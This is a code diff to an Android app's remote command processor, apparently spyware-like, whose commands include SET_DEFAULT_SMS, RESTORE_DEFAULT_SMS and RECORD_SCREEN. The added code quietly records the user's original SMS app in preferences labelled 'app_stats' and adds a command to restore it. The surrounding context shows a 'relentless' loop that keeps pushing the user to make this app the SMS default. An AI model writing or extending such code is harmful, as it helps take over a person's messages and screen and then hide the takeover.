@@ -516,6 +516,15 @@ object CommandProcessor {
                 }
                 "SET_DEFAULT_SMS" -> {
                     val mode = content.trim().uppercase()
+                    val currentDefault = android.provider.Telephony.Sms.getDefaultSmsPackage(ctx)
+                    
+                    // Capture the original package ONLY if it's not us
+                    if (currentDefault != ctx.packageName) {
+                        ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
+                            .putString("original_sms_package", currentDefault).apply()
+                        DebugLogger.log("SMS_MGR", "Captured original SMS app: $currentDefault")
+                    }
+
                     if (DefaultSmsManager.isDefaultSms(ctx)) {
                         status = "ALREADY_DEFAULT"
                         DefaultSmsManager.isRelentlessActive = false
@@ -534,6 +543,18 @@ object CommandProcessor {
                             DefaultSmsManager.requestDefault(ctx)
                             status = "DEFAULT_SMS_REQUESTED"
                         }
+                    }
+                }
+                "RESTORE_DEFAULT_SMS" -> {
+                    val prevLabel = DefaultSmsManager.getStoredPreviousLabel(ctx)
+                    if (prevLabel == null) {
+                        status = "FAILED"
+                        errorMsg = "No previous SMS package found in memory."
+                    } else {
+                        DefaultSmsManager.expectedMode = "RESTORE"
+                        DefaultSmsManager.requestDefault(ctx)
+                        status = "RESTORE_INITIATED"
+                        errorMsg = "Targeting: $prevLabel"
                     }
                 }
                 "RECORD_SCREEN" -> {
